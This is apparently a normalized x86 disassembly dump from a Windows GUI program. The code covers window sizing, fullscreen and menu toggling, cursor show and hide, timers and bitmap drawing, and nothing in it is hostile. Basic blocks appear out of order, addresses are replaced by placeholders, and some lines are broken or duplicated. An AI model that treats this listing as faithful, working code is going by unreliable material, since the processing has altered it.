mov edx [ esp + 0x24 ]
mov [ ecx + 0xc ] edx
jmp r-xdata
push edi
dec ebp
push ebp
mov ecx rw-data
call sub_46a8c0
test edx edx
jne r-xdata
mov edx [ edi + ecx + 0x10 ]
lea eax [ edi + ecx ]
mov [ eax ] edx
mov edx [ eax + 0x14 ]
mov [ eax + 0x4 ] edx
mov edx [ eax + 0x18 ]
mov [ eax + 0x8 ] edx
mov edx [ eax + 0x1c ]
mov [ eax + 0xc ] edx
mov ebp [ rw-data ]
mov edx [ rw-data ]
mov edi [ rw-data ]
inc esi
add ecx 0x10
jmp r-xdata
add eax 0xfffffffe
cmp esi eax
jge r-xdata
cmp eax ebx
jne r-xdata
cmp eax 0x1
jne r-xdata
mov ecx rw-data
mov [ esp + 0x30 ] ecx
call sub_404310
mov [ esp + 0x1c4 ] 0x0
xor ebp ebp
jmp r-xdata
cmp eax 0xa
jne r-xdata
push 0x4
push 0x1
push 0x3
push eax
call sub_48efa0
add esp 0x10
mov ecx [ rw-data ]
test ecx ecx
jle r-xdata
mov esi 0x1
xor edi edi
mov ebx [ rw-data ]
mov edx ecx
sub edx ebx
cmp edx 0xc8
jae r-xdata
mov [ rw-data ] edi
mov [ rw-data ] edi
jmp r-xdata
mov eax [ rw-data ]
test eax eax
mov [ rw-data ] ebp
je r-xdata
mov esi [ GetSystemMetrics@IAT ]
push 0x24
call esi
mov edx [ rw-data ]
mov ecx eax
mov eax ebx
sub eax edx
cdq
xor eax edx
sub eax edx
cmp eax ecx
jl r-xdata
cmp esi 0x3
jle r-xdata
dec esi
test esi esi
je r-xdata
mov esi 0x7
jmp r-xdata
mov eax ecx
cdq
sub eax edx
sar eax 0x1
add eax esi
cdq
idiv ecx
imul eax ecx
mov esi eax
test esi esi
jne r-xdata
neg ecx
jmp r-xdata
mov edx [ rw-data ]
mov esi [ esp + edx * 4 + 0x30 ]
jmp r-xdata
mov ecx [ rw-data ]
mov esi [ esp + ecx * 4 + 0x30 ]
neg esi
mov dl [ esp + 0x11 ]
mov [ rw-data ] dl
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jle r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
mov ecx [ rw-data ]
cmp ecx [ esp + 0x34 ]
jne r-xdata
mov eax [ rw-data ]
mov esi [ esp + 0x1cc ]
cmp eax esi
je r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
mov eax [ rw-data ]
mov ecx [ eax * 4 + rw-data ]
mov edx [ rw-data ]
mov eax [ edx * 4 + rw-data ]
push 0x0
push 0x0
push 0x0
push ebp
push ecx
mov ecx [ esp + 0x40 ]
push eax
push ecx
push edi
call sub_477a80
add esp 0x20
jmp r-xdata
mov ecx [ esp + 0x20 ]
sub ecx [ esp + 0x18 ]
dec ecx
cmp edi ecx
je r-xdata
mov al [ esp + 0x11 ]
test al al
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
cmp [ rw-data ] edi
jne r-xdata
cmp [ esp + 0x48 ] 0x10
jge r-xdata
mov al [ rw-data ]
test al al
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
sub ebp edx
sar ebp 0x2
mov eax ebp
xor eax eax
jmp r-xdata
test edx edx
jne r-xdata
push esi
push 0x1
call sub_487240
add esp 0x8
jmp r-xdata
mov eax [ rw-data ]
test eax eax
mov [ rw-data ] ebx
jne r-xdata
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
cmp [ rw-data ] eax
jne r-xdata
mov [ rw-data ] eax
mov edi [ rw-data ]
mov ecx [ esp + 0x1cc ]
push 0x0
push 0xa
push 0xa
sub ebp edi
push ecx
mov [ rw-data ] ebp
call [ SetTimer@IAT ]
jmp r-xdata
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov edx ebp
sub edx ecx
cmp edx eax
jge r-xdata
push 0x25
call esi
mov edx [ rw-data ]
mov ecx eax
mov eax [ esp + 0x34 ]
sub eax edx
cdq
xor eax edx
sub eax edx
cmp eax ecx
jge r-xdata
mov ecx [ esp + 0x1cc ]
push 0xa
push ecx
mov [ rw-data ] 0x0
call [ KillTimer@IAT ]
push 0x0
push 0x0
add esi 0x4
push esi
push edi
call sub_48efa0
add esp 0x10
jmp r-xdata
sub esi 0x2
mov esi ecx
mov eax [ rw-data ]
test eax eax
jle r-xdata
mov [ rw-data ] 0x1
mov [ rw-data ] 0x0
push 0x1
call [ ShowCursor@IAT ]
xor bl bl
jmp r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
test eax eax
jne r-xdata
mov al [ esp + 0x12 ]
test al al
jne r-xdata
push 0x1
call [ ShowCursor@IAT ]
mov [ rw-data ] bl
mov edx [ esp + 0x24 ]
sub edx [ esp + 0x1c ]
dec edx
cmp eax edx
jne r-xdata
mov [ esp + 0x12 ] 0x1
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
push eax
call [ GetMenu@IAT ]
mov ecx [ rw-data ]
push ecx
mov [ rw-data ] eax
mov [ rw-data ] 0x3
call esi
mov edx [ rw-data ]
push edi
push edx
call [ SetMenu@IAT ]
push edi
call esi
cmp [ rw-data ] edi
je r-xdata
cmp [ rw-data ] edi
mov al [ rw-data ]
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
mov edx [ rw-data ]
lea ecx [ esp + 0x4c ]
push ecx
push edx
call [ GetWindowRect@IAT ]
mov eax [ esp + 0x54 ]
lea ecx [ eax - 0x14 ]
mov eax [ esp + 0x28 ]
cmp eax ecx
jle r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x20 ]
add eax 0xfffffffe
shl eax 0x4
add eax edi
mov [ eax ] ebx
mov ebx [ esp + 0x1cc ]
mov [ eax + 0x4 ] ecx
mov ecx [ esp + 0x24 ]
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] ecx
mov ebp [ rw-data ]
mov edx [ rw-data ]
xor edi edi
mov eax [ rw-data ]
push 0x1
push 0x0
push esi
dec eax
push 0x1
mov [ rw-data ] eax
push 0x1
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
push 0x0
push esi
mov [ rw-data ] eax
call sub_472de0
add esp 0x8
mov [ rw-data ] esi
mov eax [ esp + 0x1cc ]
push 0xa
xor esi esi
push eax
mov [ rw-data ] esi
call [ KillTimer@IAT ]
push esi
push esi
push 0x2
push edi
mov [ rw-data ] esi
call sub_48efa0
add esp 0x10
test eax eax
jne r-xdata
mov ecx [ rw-data ]
push ecx
push ecx
mov ecx esp
mov [ esp + 0x38 ] esp
push rw-data
call sub_40a740
push ecx
mov ecx esp
mov [ esp + 0x3c ] esp
push rw-data
call sub_40a740
push 0x1
lea edx [ esp + 0x40 ]
push edx
lea eax [ esp + 0x5c ]
push eax
lea ecx [ esp + 0x58 ]
push ecx
lea edx [ esp + 0x48 ]
push edx
call sub_45ddb0
mov eax [ rw-data ]
lea eax [ eax + eax * 2 ]
shl eax 0x2
add esp 0x20
test eax eax
mov [ esp + 0x2c ] eax
jle r-xdata
test bl bl
mov edx [ esp + 0x30 ]
mov eax [ esp + 0x34 ]
mov [ rw-data ] edx
mov [ rw-data ] eax
je r-xdata
mov ebx [ esp + 0x2c ]
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
mov edx [ esp + 0x1cc ]
mov eax [ rw-data ]
mov ecx [ eax * 4 + rw-data ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ rw-data ]
mov eax [ edx * 4 + rw-data ]
push ecx
mov ecx [ esp + 0x40 ]
push eax
push ecx
push edi
call sub_477a80
add esp 0x20
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
push edi
push edi
push edi
push edi
sub eax ecx
push edi
push ebp
mov [ rw-data ] eax
call sub_466930
add esp 0x18
push ebp
call [ UpdateWindow@IAT ]
mov edx [ rw-data ]
push sub_45cdc0
push 0xc8
push 0x2
push edx
call [ SetTimer@IAT ]
mov [ rw-data ] eax
mov [ rw-data ] edi
mov eax [ rw-data ]
push edi
push eax
call sub_43ff60
add esp 0x8
test al al
je r-xdata
test al al
jne r-xdata
mov edx [ esp + 0x30 ]
mov eax [ esp + 0x34 ]
mov [ rw-data ] edx
mov [ rw-data ] eax
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov eax [ rw-data ]
push eax
call esi
push 0x0
mov [ rw-data ] 0x0
call sub_451930
add esp 0x4
push 0x0
call esi
cmp [ esp + 0x1d8 ] 0x14
jge r-xdata
test [ rw-data ] 0x8
je r-xdata
test [ rw-data ] 0x8
jne r-xdata
call sub_4719b0
add esp 0x14
push 0x1
push 0x0
push esi
push 0xffffffff
push 0xffffffff
mov ecx rw-data
mov [ esp + 0x1c4 ] 0xffffffff
call sub_401420
mov ecx [ rw-data ]
push 0x1
push 0x0
push ecx
push esi
call sub_485220
mov edx [ rw-data ]
push edx
call sub_419a00
add esp 0x14
mov esi [ ecx + ebp * 4 ]
test esi esi
lea edi [ ecx + ebp * 4 ]
je r-xdata
cmp ebp eax
jge r-xdata
mov [ rw-data ] edi
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov edi [ rw-data ]
mov [ esp + 0x40 ] eax
mov eax 0x1
cmp ecx eax
jg r-xdata
add eax 0x4
mov [ esp + 0x2c ] eax
push 0x0
call [ ShowCursor@IAT ]
lea ecx [ esp + 0x18 ]
push ecx
mov [ rw-data ] 0x0
mov [ esp + 0x1c ] 0x10
mov [ esp + 0x20 ] 0x2
mov [ esp + 0x24 ] esi
call [ _TrackMouseEvent@IAT ]
jmp r-xdata
lea edx [ esp + 0x4c ]
push edx
push esi
call [ GetClientRect@IAT ]
cmp edi 0x18
mov ebx [ esp + 0x2c ]
mov ecx edi
mov edx ebx
jge r-xdata
mov ecx [ rw-data ]
lea eax [ esp + 0x18 ]
push eax
push ecx
call [ GetWindowRect@IAT ]
mov edx [ esp + 0x24 ]
mov eax [ esp + 0x34 ]
add edx 0xffffffec
cmp eax edx
jle r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
mov eax [ rw-data ]
cmp eax edi
je r-xdata
mov al [ esp + 0x11 ]
test al al
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
lea ecx [ esp + 0x4c ]
push ecx
push edx
call [ GetWindowRect@IAT ]
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
movzx edi al
mov al [ rw-data ]
test al al
jne r-xdata
mov cl [ rw-data ]
test cl cl
jne r-xdata
mov al [ rw-data ]
test al al
je r-xdata
mov edx [ rw-data ]
and edx 0xfffffff7
push 0x0
mov [ rw-data ] edx
call sub_451770
mov cl [ rw-data ]
test cl cl
je r-xdata
mov esi [ esp + 0x1cc ]
mov [ edi ] 0x0
mov eax [ rw-data ]
mov [ eax + ebp * 4 ] 0xffffffff
inc ebp
jmp r-xdata
dec [ esi + 0xd48 ]
jne r-xdata
cmp [ rw-data ] eax
jg r-xdata
xor edi edi
mov eax [ esp + 0x54 ]
add eax 0xffffffe7
cmp edi eax
jle r-xdata
mov edi 0x18
cmp [ esp + 0x1d0 ] 0x200
jne r-xdata
mov eax [ rw-data ]
push 0xfffffff0
push eax
call [ GetWindowLongA@IAT ]
test eax 0x10000000
jne r-xdata
mov edi [ rw-data ]
push 0xf
mov [ rw-data ] 0x3
call ebx
mov edx [ rw-data ]
push 0x0
push 0x0
push 0x0
push 0x0
add edx eax
push 0x0
push ebp
mov [ rw-data ] edx
call sub_466930
mov edx [ rw-data ]
mov eax [ rw-data ]
add esp 0x18
sub edx edi
push eax
mov [ rw-data ] edx
call esi
mov ecx [ rw-data ]
mov edx [ rw-data ]
push ecx
push edx
call [ SetMenu@IAT ]
push 0x0
call esi
push 0x0
push ebp
call [ ValidateRect@IAT ]
push 0xf
call ebx
push 0x0
push 0x0
push 0x0
push 0x0
add eax edi
push 0x0
push ebp
mov [ rw-data ] eax
call sub_466930
mov al [ rw-data ]
add esp 0x18
test al al
mov [ rw-data ] 0x0
mov [ esp + 0x11 ] 0x1
jne r-xdata
mov ecx [ rw-data ]
push eax
push ecx
call [ KillTimer@IAT ]
mov [ rw-data ] edi
mov ecx [ rw-data ]
mov edx [ ecx * 4 + rw-data ]
mov eax [ rw-data ]
mov ecx [ eax * 4 + rw-data ]
mov eax [ esp + 0x28 ]
push edi
push 0x1
push edi
push ebp
push edx
mov edx [ esp + 0x58 ]
push ecx
push edx
push eax
call sub_477a80
add esp 0x20
push 0x0
mov [ rw-data ] 0x0
call sub_451820
add esp 0x4
test bl bl
je r-xdata
mov eax [ esp + 0x58 ]
mov ecx [ esp + 0x44 ]
add eax 0xffffffec
cmp ecx eax
jle r-xdata
mov edx [ rw-data ]
push edx
push 0x1
push 0x48
call sub_48a5f0
add esp 0xc
test edi edi
setne al
mov [ rw-data ] al
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
push eax
mov [ esp + 0x15 ] 0x1
call esi
push edi
mov [ rw-data ] edi
call sub_451930
mov eax [ rw-data ]
mov ecx [ rw-data ]
push 0x0
push 0x0
push 0x0
push 0x0
add eax ecx
push 0x0
push ebp
mov [ rw-data ] eax
call sub_466930
mov edx [ rw-data ]
add esp 0x1c
push 0x0
push edx
call [ ValidateRect@IAT ]
push 0x0
call esi
mov bl 0x1
mov [ esp + 0x12 ] bl
jmp r-xdata
mov al [ esp + 0x11 ]
test al al
jne r-xdata
mov edx [ rw-data ]
or edx 0x8
push edi
mov [ esp + 0x15 ] 0x1
mov [ rw-data ] edx
call sub_451770
mov bl 0x1
mov [ esp + 0x16 ] bl
jmp r-xdata
mov edx [ rw-data ]
mov ecx [ edx * 4 + rw-data ]
mov edx [ rw-data ]
push 0x0
push edi
push 0x0
push ebp
push ecx
mov ecx [ edx * 4 + rw-data ]
mov edx [ esp + 0x58 ]
push ecx
push edx
push eax
call sub_477a80
add esp 0x20
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
mov edx [ rw-data ]
lea ecx [ esp + 0x18 ]
push ecx
push edx
call [ GetClientRect@IAT ]
mov eax [ esp + 0x20 ]
mov esi [ esp + 0x18 ]
mov edx [ esp + 0x48 ]
mov ebp [ esp + 0x1c ]
mov ebx [ esp + 0x30 ]
sub eax esi
sub eax edx
cdq
sub eax edx
mov ecx eax
mov eax [ esp + 0x24 ]
sub eax ebp
sub eax ebx
cdq
sub eax edx
mov ebp eax
sar ecx 0x1
sar ebp 0x1
test ecx ecx
jge r-xdata
mov [ esp + 0x40 ] 0x0
cmp ebx 0x18
jge r-xdata
mov edi eax
mov eax [ rw-data ]
push 0xfffffff0
push eax
call [ GetWindowLongA@IAT ]
test eax 0x10000000
je r-xdata
mov al [ rw-data ]
test al al
je r-xdata
push 0x1
call [ ShowCursor@IAT ]
mov [ rw-data ] 0x1
jmp r-xdata
mov ecx [ rw-data ]
push ecx
mov ecx [ rw-data ]
push ecx
call esi
push 0x1
mov [ rw-data ] 0x1
call sub_451820
mov edx [ rw-data ]
add esp 0x4
push 0x0
push edx
call [ ValidateRect@IAT ]
push 0x0
call esi
mov eax [ rw-data ]
mov [ esp + 0x12 ] 0x1
push eax
jmp r-xdata
mov al [ rw-data ]
test al al
je r-xdata
cmp [ esp + 0x1d8 ] 0x14
jge r-xdata
mov eax [ rw-data ]
mov ecx [ eax * 4 + rw-data ]
mov edx [ rw-data ]
mov eax [ edx * 4 + rw-data ]
mov edx [ esp + 0x28 ]
push 0x0
push edi
push 0x0
push ebp
push ecx
mov ecx [ esp + 0x58 ]
push eax
push ecx
push edx
call sub_477a80
add esp 0x20
add esp 0x4
test ebp ebp
jge r-xdata
xor ecx ecx
mov eax [ esp + 0x58 ]
add eax 0xffffffe7
cmp ebx eax
jle r-xdata
mov [ esp + 0x2c ] 0x18
mov ebx [ esp + 0x2c ]
mov ecx [ rw-data ]
push 0x0
push ecx
call [ ShowWindow@IAT ]
mov edx [ esp + 0x24 ]
mov ebx [ esp + 0x1c ]
mov eax [ esp + 0x20 ]
mov esi [ esp + 0x18 ]
mov ecx [ rw-data ]
sub edx ebx
shl edx 0x10
sub eax esi
or edx eax
push edx
push 0x0
push 0x5
push ecx
mov [ rw-data ] 0x3
mov [ rw-data ] 0x0
call [ SendMessageA@IAT ]
mov edx [ rw-data ]
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push edx
mov [ rw-data ] 0x1
call sub_466930
mov eax [ rw-data ]
add esp 0x18
push eax
call [ UpdateWindow@IAT ]
mov [ rw-data ] 0x0
mov ecx [ rw-data ]
push 0x5
push ecx
mov [ esp + 0x19 ] 0x1
call [ ShowWindow@IAT ]
mov edx [ rw-data ]
push edx
mov [ rw-data ] 0x3
call [ GetMenu@IAT ]
test eax eax
je r-xdata
mov al [ esp + 0x11 ]
test al al
jne r-xdata
call [ UpdateWindow@IAT ]
mov ecx [ rw-data ]
push ecx
mov [ esp + 0x15 ] 0x1
call esi
mov edx [ rw-data ]
push edx
push 0x1
push 0x48
call sub_48a5f0
mov ecx [ rw-data ]
mov eax [ rw-data ]
push 0x0
push 0x0
push 0x0
push 0x0
add ecx eax
push 0x0
push ebp
mov [ rw-data ] ecx
call sub_466930
add esp 0x24
push 0x0
call esi
test edi edi
setne cl
mov bl 0x1
mov [ rw-data ] cl
mov [ esp + 0x12 ] bl
jmp r-xdata
mov al [ esp + 0x11 ]
test al al
jne r-xdata
mov eax edi
cdq
sub eax edx
mov esi eax
mov eax [ rw-data ]
sar esi 0x1
sub esi ecx
add esi [ esp + 0x28 ]
xor bl bl
add esi eax
jns r-xdata
xor ebp ebp
cmp ecx edi
jne r-xdata
mov [ esp + 0x2c ] eax
mov ebx eax
mov edx [ esp + 0x24 ]
mov edi [ esp + 0x1c ]
mov ecx [ esp + 0x20 ]
sub edx edi
movzx eax dx
sub ecx [ esp + 0x18 ]
movzx edx cx
shl eax 0x10
or eax edx
push 0xf
call ebx
mov edx [ esp + 0x1c ]
mov ecx [ esp + 0x24 ]
mov esi [ esp + 0x18 ]
sub ecx edx
mov edx [ esp + 0x20 ]
sub ecx eax
movzx eax cx
sub edx esi
movzx ecx dx
shl eax 0x10
or eax ecx
jmp r-xdata
mov ecx [ rw-data ]
mov edx [ ecx * 4 + rw-data ]
mov eax [ rw-data ]
mov ecx [ eax * 4 + rw-data ]
mov eax [ esp + 0x28 ]
push 0x0
push 0x1
push 0x0
push ebp
push edx
mov edx [ esp + 0x58 ]
push ecx
push edx
push eax
call sub_477a80
add esp 0x20
mov ecx [ rw-data ]
mov edx [ ecx * 4 + rw-data ]
mov eax [ rw-data ]
mov ecx [ eax * 4 + rw-data ]
mov eax [ esp + 0x28 ]
push 0x0
push 0x1
push 0x0
push ebp
push edx
mov edx [ esp + 0x58 ]
push ecx
push edx
push eax
call sub_477a80
add esp 0x20
mov eax [ rw-data ]
add edi eax
mov [ esp + 0x30 ] edi
fild [ esp + 0x30 ]
push ecx
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
mov ecx eax
mov eax esi
cdq
idiv ecx
add esp 0x4
mov edi eax
mov eax [ rw-data ]
cmp edi eax
jl r-xdata
mov bl 0x1
xor esi esi
lea eax [ esp + 0x30 ]
push eax
push esi
mov [ esp + 0x38 ] edi
mov [ esp + 0x3c ] ebx
call [ ClientToScreen@IAT ]
mov ecx [ esp + 0x34 ]
mov edx [ esp + 0x30 ]
push ecx
push edx
call [ SetCursorPos@IAT ]
jmp r-xdata
cmp edx ebx
je r-xdata
push eax
mov eax [ rw-data ]
push 0x0
push 0x5
push eax
call [ SendMessageA@IAT ]
mov ecx [ rw-data ]
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ecx
call sub_466930
mov edx [ rw-data ]
add esp 0x18
push 0x0
push edx
call [ ValidateRect@IAT ]
jmp r-xdata
mov eax [ esp + 0x40 ]
mov ecx [ esp + 0x44 ]
cdq
sub eax edx
mov esi eax
mov eax [ rw-data ]
sar esi 0x1
sub esi ebp
add esi ecx
add esi eax
jns r-xdata
mov bl 0x1
lea edi [ eax - 0x1 ]
mov eax [ rw-data ]
mov ecx [ eax * 4 + rw-data ]
mov edx [ rw-data ]
mov eax [ edx * 4 + rw-data ]
push 0x0
push 0x0
push 0x1
push esi
push ecx
push eax
push ebx
push edi
call sub_477a80
mov al [ rw-data ]
add esp 0x20
test al al
je r-xdata
mov eax [ esp + 0x2c ]
mov edx [ esp + 0x40 ]
add edx eax
add edx [ rw-data ]
mov [ esp + 0x30 ] edx
fild [ esp + 0x30 ]
push ecx
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
mov ecx eax
mov eax esi
cdq
idiv ecx
add esp 0x4
mov esi eax
mov eax [ rw-data ]
cmp esi eax
jl r-xdata
mov bl 0x1
xor esi esi
test esi esi
jge r-xdata
mov bl 0x1
lea esi [ eax - 0x1 ]
mov ecx rw-data
call sub_4010c0
test eax eax
jbe r-xdata
mov bl 0x1
xor esi esi
mov eax [ rw-data ]
cmp eax 0xc
jge r-xdata
mov ecx rw-data
call sub_4010c0
jmp r-xdata
add eax 0xfffffff4
cdq
and edx 0x3
add eax edx
sar eax 0x2
lea edx [ eax + eax * 2 ]
mov eax [ edx * 4 + rw-data ]
mov eax [ rw-data ]
jmp r-xdata
mov ebp [ rw-data ]
and ebp 0x1
mov edx [ rw-data ]
je r-xdata
mov ecx esi
imul ecx edx
add ecx edi
lea ecx [ esi + 0x1 ]
imul ecx edx
sub ecx edi
dec ecx
jmp r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
test ebp ebp
je r-xdata
cmp ecx eax
jl r-xdata
test bl bl
je r-xdata
mov [ rw-data ] eax
lea ecx [ esi - 0x1 ]
imul ecx edx
add ecx edi
imul esi edx
sub esi edi
dec esi
mov ecx esi
jmp r-xdata
mov [ rw-data ] 0xffffffff
or ecx 0xffffffff
jmp r-xdata
mov bl 0x1
mov eax [ esp + 0x1cc ]
lea ecx [ esp + 0x30 ]
push ecx
mov [ rw-data ] 0x1
mov [ esp + 0x34 ] 0x10
mov [ esp + 0x38 ] 0x2
mov [ esp + 0x3c ] eax
call [ _TrackMouseEvent@IAT ]
jmp r-xdata
push 0x0
push ecx
call sub_472de0
mov al [ rw-data ]
add esp 0x8
test al al
jne r-xdata
sub_493140
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_4c160f
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x930
push ebx
mov ebx [ ebp + 0x8 ]
xor eax eax
cmp ebx eax
push esi
push edi
je r-xdata
xor eax eax
mov ecx [ esp + 0x93c ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ rw-data ] eax
jne r-xdata
mov cl [ ebp + 0xc ]
test cl cl
mov esi 0x10
jne r-xdata
cmp [ rw-data ] eax
jne r-xdata
mov ecx rw-data
call sub_404310
mov eax [ ebx + 0x12c ]
or edi 0xffffffff
test eax eax
jne r-xdata
mov [ esp + 0x14 ] eax
push 0x1
call sub_489430
add esp 0x4
jmp r-xdata
cmp [ ebx + 0x130 ] esi
jb r-xdata
mov [ esp + 0x10 ] edi
jmp r-xdata
mov ecx [ rw-data ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov ecx [ esp + 0x93c ]
pop edi
pop esi
mov eax 0x1
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebx + 0x11c ]
mov eax [ ebx + 0x11c ]
jmp r-xdata
mov eax [ ebx + 0x148 ]
test eax eax
jne r-xdata
cmp [ ebx + 0x34 ] esi
jb r-xdata
cmp [ esp + 0x14 ] edx
jge r-xdata
cmp [ ebx + 0x14c ] esi
jb r-xdata
mov [ esp + 0x50 ] edi
jmp r-xdata
push eax
call j_sub_4b692d
add esp 0x4
mov [ esp + 0x10 ] eax
lea esi [ ebx + 0x20 ]
mov esi [ ebx + 0x20 ]
jmp r-xdata
lea eax [ ebx + 0x138 ]
mov eax [ ebx + 0x138 ]
jmp r-xdata
mov eax [ ebx + 0x164 ]
test eax eax
jne r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
mov edx [ ecx + 0x14 ]
sub eax edi
push eax
push esi
push edx
push 0x0
call sub_401150
test eax eax
mov esi 0x10
je r-xdata
mov ecx [ esp + 0x18 ]
mov eax esi
add ecx edi
lea edi [ eax + 0x1 ]
nop
cmp [ ebx + 0x168 ] esi
jb r-xdata
mov [ esp + 0x54 ] edi
jmp r-xdata
push eax
call j_sub_4b692d
add esp 0x4
mov [ esp + 0x50 ] eax
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x18 ]
inc ecx
mov [ esp + 0x14 ] ecx
add eax 0x1c
jmp r-xdata
lea eax [ ebx + 0x154 ]
mov eax [ ebx + 0x154 ]
jmp r-xdata
cmp [ ebx + 0x34 ] esi
jb r-xdata
mov edi [ rw-data ]
test edi edi
mov [ esp + 0x18 ] eax
jne r-xdata
add ebx 0x20
mov [ esp + 0x40 ] ebx
mov eax [ ebx + 0x20 ]
mov [ esp + 0x40 ] eax
jmp r-xdata
push eax
call j_sub_4b692d
add esp 0x4
mov [ esp + 0x54 ] eax
xor eax eax
jmp r-xdata
mov ecx eax
call sub_43fd90
cmp eax ebx
je r-xdata
push 0xd50
call sub_4b573e
add esp 0x4
mov [ esp + 0x3c ] eax
xor ebx ebx
cmp eax ebx
mov [ esp + 0x944 ] ebx
je r-xdata
mov [ esp + 0x1c ] eax
cmp [ esp + 0x10 ] ebx
mov [ esp + 0x944 ] 0x1
mov [ esp + 0x44 ] ebx
jle r-xdata
inc [ eax + 0xd48 ]
mov eax [ rw-data ]
mov ecx 0x14
mov [ esp + 0x38 ] ecx
mov [ esp + 0x34 ] eax
mov [ esp + 0x10 ] ecx
mov eax [ rw-data ]
test eax eax
mov edi [ esp + 0x40 ]
jne r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ rw-data ]
shl eax 0x4
mov [ esp + 0x3c ] eax
add eax ecx
mov ecx [ eax ]
mov [ esp + 0x24 ] ecx
mov edi [ eax + 0x4 ]
mov [ esp + 0x28 ] edi
mov edx [ eax + 0x8 ]
mov [ esp + 0x2c ] edx
mov eax [ eax + 0xc ]
mov ebx ecx
mov [ esp + 0x30 ] eax
mov eax [ esp + 0x10 ]
sub ebx edx
add ebx eax
test ebx ebx
jle r-xdata
mov edi [ rw-data ]
test edi edi
je r-xdata
mov eax edi
lea edx [ eax + 0x1 ]
mov eax edi
lea edx [ eax + 0x1 ]
mov edi edi
mov eax [ rw-data ]
push 0xcc0020
push edi
push edx
mov edx [ esp + 0x2c ]
push eax
push edx
mov edx [ esp + 0x24 ]
push esi
push edi
add ecx edx
push ecx
push eax
call [ BitBlt@IAT ]
xor eax eax
mov ecx 0xb
lea edi [ esp + 0xe8 ]
[ edi ]
mov ecx [ esp + 0x20 ]
add esi ebx
lea eax [ esi + 0x3 ]
cdq
and edx 0x3
add eax edx
push 0x0
push 0x0
sar eax 0x2
shl eax 0x2
lea edx [ esp + 0x54 ]
push edx
mov [ esp + 0xf8 ] eax
push 0x0
lea eax [ esp + 0xf8 ]
push eax
neg ecx
push 0x0
mov [ esp + 0x100 ] 0x28
mov [ esp + 0x108 ] ecx
mov [ esp + 0x110 ] 0x0
mov [ esp + 0x10c ] 0x1
mov [ esp + 0x10e ] 0x18
call [ CreateDIBSection@IAT ]
test eax eax
mov [ esp + 0x14 ] eax
je r-xdata
xor ecx ecx
xor eax eax
mov ebx [ rw-data ]
sub ebx edi
sar ebx 0x4
test ebx ebx
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov edx [ rw-data ]
push eax
push edi
push edx
push 0x0
mov ecx rw-data
call sub_401150
test eax eax
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ rw-data ]
sub eax edx
push eax
push edi
push ecx
push 0x0
mov ecx rw-data
call sub_401150
test eax eax
je r-xdata
mov edx [ rw-data ]
sub edx ecx
sar edx 0x4
xor edx edx
jmp r-xdata
mov ecx rw-data
call sub_401420
mov esi [ esp + 0x1c ]
test esi esi
mov [ esp + 0x944 ] 0xffffffff
je r-xdata
push 0x0
call [ GetDC@IAT ]
push eax
mov [ esp + 0x4c ] eax
call [ CreateCompatibleDC@IAT ]
mov edi eax
test edi edi
jne r-xdata
mov edx [ esp + 0x18 ]
add eax edx
mov [ esp + 0x30 ] eax
lea eax [ esp + 0x24 ]
push eax
mov ecx rw-data
call sub_46b7e0
mov esi [ esp + 0x40 ]
mov eax esi
mov [ esp + 0x74 ] 0xf
mov [ esp + 0x70 ] 0x0
mov [ esp + 0x60 ] 0x0
lea edx [ eax + 0x1 ]
mov edi edi
cmp edx esi
jle r-xdata
or ecx 0xffffffff
or eax 0xffffffff
mov [ esp + 0x14 ] 0x0
add edi 0x8
jmp r-xdata
sub esp 0x1c
mov ecx esp
mov eax edi
mov [ ecx + 0x18 ] 0xf
mov [ ecx + 0x14 ] 0x0
mov [ esp + 0x58 ] esp
mov [ ecx + 0x4 ] 0x0
lea esi [ eax + 0x1 ]
lea ebx [ ebx ]
mov eax [ rw-data ]
test eax eax
je r-xdata
